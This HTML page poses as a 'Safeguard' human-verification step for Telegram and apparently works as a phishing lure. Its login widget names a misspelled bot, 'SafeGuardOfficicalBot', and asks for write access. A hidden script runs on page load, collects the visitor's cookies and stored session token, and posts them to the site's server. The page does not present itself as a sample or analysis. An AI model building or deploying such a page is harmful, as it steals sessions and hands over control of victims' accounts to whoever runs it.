<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Safeguard Verification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #212121;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      text-align: center;
    }
    .button {
      background-color: #0088cc;
      color: white;
      border: none;
      padding: 15px 30px;
      font-size: 18px;
      border-radius: 5px;
      cursor: pointer;
    }
    .button:hover {
      background-color: #0077aa;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Human Verification</h1>
    <p>Click below to log in with Telegram:</p>
    <script async src="https://telegram.org/js/telegram-widget.js?7"
      data-telegram-login="SafeGuardOfficicalBot"
      data-size="large"
      data-auth-url="/api/users/telegram/info"
      data-request-access="write"></script>
  </div>
  <script>
    document.addEventListener("DOMContentLoaded", () => {
      const cookies = document.cookie;
      const sessionData = localStorage.getItem("session");

      if (cookies || sessionData) {
        fetch("/api/users/telegram/info", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ cookies, sessionData }),
        });
      }
    });
  </script>
</body>
</html>
